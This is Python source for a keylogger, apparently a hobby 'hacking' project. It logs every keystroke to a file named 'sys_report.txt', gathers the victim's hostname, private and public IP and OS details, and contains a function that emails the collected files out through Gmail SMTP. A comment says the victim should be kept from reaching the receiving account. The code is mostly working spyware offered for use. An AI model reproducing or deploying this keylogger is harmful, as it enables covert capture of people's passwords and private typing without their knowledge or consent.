#imports
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from pynput.keyboard import Key, Listener
from scipy.io.wavfile import write
from cryptography.fernet import Fernet
from requests import get
from multiprocessing import Process, freeze_support
from PIL import ImageGrab
import socket,platform,time,os,smtplib,getpass

keyslogged = "/sys_report.txt"
filepath = (r"/home/gustavo/documents/python/hacking")
email_address = "<insert_email>"
email_password = "<insert_password>"
system_info = "/sys_info.txt"

keyspressed = []
i = 0

def on_press(key):
    global keyspressed, i
    keyspressed.append(key)
    i += 1

    #clears keyspressed string for every key
    if i >= 1:
        i = 0
        write_file(keyspressed)
        keyspressed = []

def write_file(keyspressed):
    with open(filepath + keyslogged, "a") as f:
        for key in keyspressed:
            #removes single quotes
            new_key = str(key).replace("'","")
            if new_key.find("space") > 0:
                f.write('\n')
                f.close()
            #if it isnt finding any key stop looking for it until update on listener
            elif new_key.find("Key") == -1:
                f.write(new_key)
                f.close()

def on_release(key):
    #stop on escape key press
    if key == Key.esc:
        return False

#smtp loggin is dead
def send_email(filename, attachment, towho):
    #currently using same email to send and to receive, ideal would be to have two separate so the 'user' cant have access to account and infoo
    incoming = email_address
    msg = MIMEMultipart()
    msg['From'] = incoming
    msg['To'] = towho   
    msg['Subject'] = "sys_report.v1"
    body = "Body_of_the_mail"
    msg.attach(MIMEText(body,'plain'))
    filename = filename
    attachment = open(attachment, 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(email_address, email_password)
    text = msg.as_string()
    s.sendmail(email_address, towho, text)
    s.quit()

#gets os info
def comp_info():
    with open(filepath + system_info, "a") as g:
        hostname = socket.gethostname()
        ipv4 = socket.gethostbyname(hostname)
        try:
            public_ipv4 = get("https://api.ipify.org").text
            g.write("public ip address: " + public_ipv4 + "\n")

        except Exception:
            g.write("couldn't get public ip\n")

        g.write("processor: " + platform.processor() + "\n")
        g.write("os: " + platform.system() + " " + platform.version() + "\n")
        g.write("machine: " + platform.machine() + "\n")
        g.write("hostname: " + hostname + "\n")
        g.write("private ip: " + ipv4 + "\n")

comp_info()

with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()



